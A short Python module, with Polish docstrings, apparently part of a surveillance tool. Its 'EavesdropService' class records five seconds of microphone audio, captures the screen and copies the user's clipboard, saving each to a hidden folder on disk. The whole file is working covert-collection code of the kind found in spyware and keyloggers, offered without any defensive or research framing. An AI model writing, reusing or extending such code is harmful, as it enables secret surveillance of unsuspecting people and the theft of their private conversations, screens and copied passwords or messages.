import sys

from settings import file_path, filenames
from PIL import ImageGrab
from scipy.io.wavfile import write
import sounddevice as sd
import win32clipboard


class EavesdropService:

    @staticmethod
    def microphone():
        """
            Metoda zapisuję przez 5 sekund każdy dzwięk z mikrofonu, do pliku o podanej nazwie w ukrytym folderze.
        """
        fs = 44100
        seconds = 5
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_path + "\\" + filenames["audio"], fs, recording)

    @staticmethod
    def screenshot():
        """
            Metoda zapisuję zdjęcie ekranu do ukrytego folderu na dysku
        """
        im = ImageGrab.grab()
        im.save(file_path + "\\" + filenames["screenshot"])

    @staticmethod
    def copy_clipboard():
        """
            Metoda zapisuje stringa skopiowanego przez użytkownika do ukrytego folderu na dysku
        """
        with open(file_path + "\\" + filenames["clipboard"], "a") as f:
            try:
                if sys.platform == "win32":
                    import win32clipboard as clip
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(pasted_data)
                    f.write(pasted_data)
            except Exception as e:
                f.write("Clipboard could be not be copied")
                print(e)
